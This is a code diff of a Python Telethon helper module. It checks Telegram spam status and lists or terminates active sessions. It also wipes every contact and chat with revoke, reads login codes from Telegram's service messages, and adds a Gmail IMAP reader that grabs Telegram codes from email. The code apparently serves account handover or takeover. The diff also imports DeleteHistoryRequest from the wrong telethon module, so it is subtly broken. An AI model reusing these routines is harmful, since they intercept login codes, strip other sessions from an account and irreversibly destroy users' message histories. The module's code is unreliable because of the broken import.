@@ -1,35 +1,36 @@
 import asyncio
+import imaplib
+import email as email_lib
 import logging
+import re
+import time
 from datetime import datetime, timezone
+
 from telethon import TelegramClient
-from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
-from telethon.tl.functions.messages import DeleteHistoryRequest, DeleteChatRequest
-from telethon.tl.functions.contacts import DeleteContactsRequest
-from telethon.tl.types import (
-    User, Chat, Channel, InputPeerUser, InputPeerChat, InputPeerChannel,
-    MessageEntityPhone
+from telethon.tl.functions.account import (
+    GetAuthorizationsRequest,
+    ResetAuthorizationRequest,
+    DeleteHistoryRequest,
 )
+from telethon.tl.functions.contacts import DeleteContactsRequest
+from telethon.tl.types import InputPeerUser, User, Chat, Channel
 from telethon.errors import RPCError
 
 logger = logging.getLogger(__name__)
 
 
 async def check_spam_status(client: TelegramClient) -> str:
-    """
-    Check if an account is spam-limited using Telegram's @SpamBot.
-    Returns a string: "✅ Clean (Not Spam)" or "⚠️ Limited / Restricted".
-    """
+    """Check if account is spam-limited via @SpamBot."""
     try:
         spam_bot = await client.get_entity("@SpamBot")
         msg = await client.send_message(spam_bot, "/start")
         await asyncio.sleep(1.5)
-
         async for m in client.iter_messages(spam_bot, limit=1):
             if m.text:
-                text = m.text.lower()
-                if "good" in text or "not" in text or "no restrictions" in text or "fine" in text:
+                t = m.text.lower()
+                if any(w in t for w in ("good", "not limited", "no restrictions", "fine")):
                     return "✅ Clean (Not Spam)"
-                elif "limited" in text or "restricted" in text or "spam" in text:
+                elif any(w in t for w in ("limited", "restricted", "spam")):
                     return "⚠️ Limited / Restricted"
                 else:
                     return f"ℹ️ {m.text[:100]}"
@@ -40,28 +41,25 @@ async def check_spam_status(client: TelegramClient) -> str:
 
 
 async def get_devices(client: TelegramClient) -> list:
-    """
-    Get all active authorized sessions (devices) for the account.
-    Returns list of dicts with device info.
-    """
+    """Get all active authorized sessions (devices)."""
     try:
         auths = await client(GetAuthorizationsRequest())
         devices = []
-        for auth in auths.authorizations:
+        for a in auths.authorizations:
             devices.append({
-                "hash": auth.hash,
-                "device_model": auth.device_model or "Unknown",
-                "platform": auth.platform or "Unknown",
-                "app_name": auth.app_name or "Unknown",
-                "app_version": auth.app_version or "",
-                "ip": auth.ip or "",
-                "country": auth.country or "",
-                "region": auth.region or "",
-                "date_created": auth.date_created,
-                "date_active": auth.date_active,
-                "current": auth.current,
-                "official_app": auth.official_app,
-                "password_pending": auth.password_pending,
+                "hash": a.hash,
+                "device_model": a.device_model or "Unknown",
+                "platform": a.platform or "Unknown",
+                "app_name": a.app_name or "Unknown",
+                "app_version": a.app_version or "",
+                "ip": a.ip or "",
+                "country": a.country or "",
+                "region": a.region or "",
+                "date_created": a.date_created,
+                "date_active": a.date_active,
+                "current": a.current,
+                "official_app": a.official_app,
+                "password_pending": a.password_pending,
             })
         return devices
     except Exception as e:
@@ -80,17 +78,17 @@ async def terminate_device(client: TelegramClient, hash_id: int) -> bool:
 
 
 async def clear_all_data(client: TelegramClient) -> dict:
-    """
-    Clear all contacts, dialogs (private chats, groups, channels).
-    Returns a dict with counts of what was cleared.
-    """
+    """Clear all contacts, dialogs, groups, channels."""
     result = {"contacts": 0, "dialogs": 0, "errors": 0}
 
     # 1. Delete all contacts
     try:
         contacts = await client.get_contacts()
         if contacts:
-            input_users = [InputPeerUser(c.id, c.access_hash) for c in contacts if hasattr(c, 'access_hash') and c.access_hash]
+            input_users = [
+                InputPeerUser(c.id, c.access_hash)
+                for c in contacts if hasattr(c, 'access_hash') and c.access_hash
+            ]
             if input_users:
                 await client(DeleteContactsRequest(id=input_users))
                 result["contacts"] = len(input_users)
@@ -98,36 +96,18 @@ async def clear_all_data(client: TelegramClient) -> dict:
         logger.error(f"Clear contacts error: {e}")
         result["errors"] += 1
 
-    # 2. Delete all dialogs (chats, groups, channels)
+    # 2. Delete all dialogs
     try:
         dialogs = await client.get_dialogs()
         for dialog in dialogs:
             try:
                 entity = dialog.entity
-                if isinstance(entity, User) and entity.id != 777000:  # Skip Telegram service
-                    await client(DeleteHistoryRequest(
-                        peer=entity,
-                        max_id=0,
-                        just_clear=False,
-                        revoke=True
-                    ))
+                if isinstance(entity, User) and entity.id != 777000:
+                    await client.delete_dialog(entity, revoke=True)
                     result["dialogs"] += 1
-                elif isinstance(entity, Chat):
-                    await client.delete_dialog(entity)
+                elif isinstance(entity, (Chat, Channel)):
+                    await client.delete_dialog(entity, revoke=True)
                     result["dialogs"] += 1
-                elif isinstance(entity, Channel):
-                    if not entity.broadcast:  # Groups
-                        try:
-                            await client.delete_dialog(entity)
-                            result["dialogs"] += 1
-                        except Exception:
-                            pass
-                    else:  # Channels
-                        try:
-                            await client.delete_dialog(entity)
-                            result["dialogs"] += 1
-                        except Exception:
-                            pass
             except Exception:
                 result["errors"] += 1
                 continue
@@ -139,32 +119,83 @@ async def clear_all_data(client: TelegramClient) -> dict:
 
 
 async def fetch_otp(client: TelegramClient) -> str:
-    """
-    Fetch the latest OTP/code from Telegram service messages.
-    """
+    """Fetch the latest OTP from Telegram service messages (user 777000)."""
     try:
-        # Telegram sends login codes from user 777000
         async for msg in client.iter_messages(777000, limit=5):
             if msg.text:
-                import re
-                # Look for login code pattern: "Login code: XXXXX" or just code digits
                 match = re.search(r'Login code[:.\s]*(\d{4,7})', msg.text, re.IGNORECASE)
                 if match:
                     return match.group(1)
-                # Try to find any numeric code
                 match = re.search(r'(\d{4,7})', msg.text)
-                if match:
-                    # Verify it looks like a login code
-                    if "code" in msg.text.lower() or "login" in msg.text.lower():
-                        return match.group(1)
+                if match and ("code" in msg.text.lower() or "login" in msg.text.lower()):
+                    return match.group(1)
         return None
     except Exception as e:
         logger.error(f"Fetch OTP error: {e}")
         return None
 
 
+async def read_email_otp(email_address: str, app_password: str,
+                         sender_email: str = "noreply@telegram.org",
+                         wait_seconds: int = 15) -> str | None:
+    """
+    Connect to Gmail IMAP, find the latest email from Telegram, extract code.
+
+    Returns the OTP code string or None.
+    """
+    try:
+        mail = imaplib.IMAP4_SSL("imap.gmail.com", 993)
+        mail.login(email_address, app_password)
+        mail.select("inbox")
+
+        # Wait a bit for the email to arrive
+        await asyncio.sleep(3)
+
+        # Search for unread emails from Telegram
+        status, messages = mail.search(None, '(UNSEEN FROM "telegram.org")')
+        if status != "OK" or not messages[0]:
+            status, messages = mail.search(None, '(FROM "telegram.org")')
+
+        if status != "OK" or not messages[0]:
+            mail.logout()
+            return None
+
+        # Get the latest message
+        latest = messages[0].split()[-1]
+        status, msg_data = mail.fetch(latest, "(RFC822)")
+        if status != "OK":
+            mail.logout()
+            return None
+
+        raw_email = msg_data[0][1]
+        msg = email_lib.message_from_bytes(raw_email)
+
+        # Extract body
+        body = ""
+        if msg.is_multipart():
+            for part in msg.walk():
+                if part.get_content_type() == "text/plain":
+                    body = part.get_payload(decode=True).decode(errors="ignore")
+                    break
+        else:
+            body = msg.get_payload(decode=True).decode(errors="ignore")
+
+        mail.logout()
+
+        # Extract code from body - look for patterns like "12345" near "code"
+        code_match = re.search(r'(\b\d{4,7}\b)', body)
+        if code_match:
+            return code_match.group(1)
+
+        return None
+
+    except Exception as e:
+        logger.error(f"IMAP email read error: {e}")
+        return None
+
+
 def format_account_info(info: dict) -> str:
-    """Format account info for displaying in bot messages."""
+    """Format account info for bot messages."""
     name = f"{info.get('first_name', '')} {info.get('last_name', '')}".strip()
     username = info.get('username', '')
     text = (
@@ -180,34 +211,28 @@ def format_account_info(info: dict) -> str:
 
 
 def format_device(dev: dict, index: int = 0) -> str:
-    """Format device info for display."""
-    current = "✅ Current" if dev.get("current") else ""
+    """Format device info."""
+    current_mark = " ✅ CURRENT" if dev.get("current") else ""
     app = f"{dev.get('app_name', '')} {dev.get('app_version', '')}".strip()
     active_ts = dev.get("date_active", 0)
     created_ts = dev.get("date_created", 0)
 
-    def _time_ago(ts):
+    def _ago(ts):
         if not ts:
             return "Unknown"
-        from datetime import datetime, timezone
         diff = datetime.now(timezone.utc) - datetime.fromtimestamp(ts, tz=timezone.utc)
-        days = diff.days
-        hours = diff.seconds // 3600
-        mins = (diff.seconds % 3600) // 60
-        if days > 0:
-            return f"{days}d ago"
-        if hours > 0:
-            return f"{hours}h {mins}m ago"
-        return f"{mins}m ago"
+        d, h, m = diff.days, diff.seconds // 3600, (diff.seconds % 3600) // 60
+        if d > 0: return f"{d}d ago"
+        if h > 0: return f"{h}h {m}m ago"
+        return f"{m}m ago"
 
-    text = (
-        f"📱 **Device {index + 1}** {current}\n"
+    return (
+        f"📱 **Device #{index + 1}**{current_mark}\n"
         f"├─ Model    : {dev.get('device_model', 'Unknown')}\n"
         f"├─ Platform : {dev.get('platform', 'Unknown')}\n"
         f"├─ App      : {app or 'Unknown'}\n"
         f"├─ IP       : {dev.get('ip', '') or ''}\n"
-        f"├─ Region   : {dev.get('region', '') or ''} {dev.get('country', '') or ''}".strip() + "\n"
-        f"├─ Active   : {_time_ago(active_ts)}\n"
-        f"└─ Created  : {_time_ago(created_ts)}\n"
+        f"├─ Region   : {dev.get('region', '')} {dev.get('country', '')}\n"
+        f"├─ Active   : {_ago(active_ts)}\n"
+        f"└─ Created  : {_ago(created_ts)}\n"
     )
-    return text
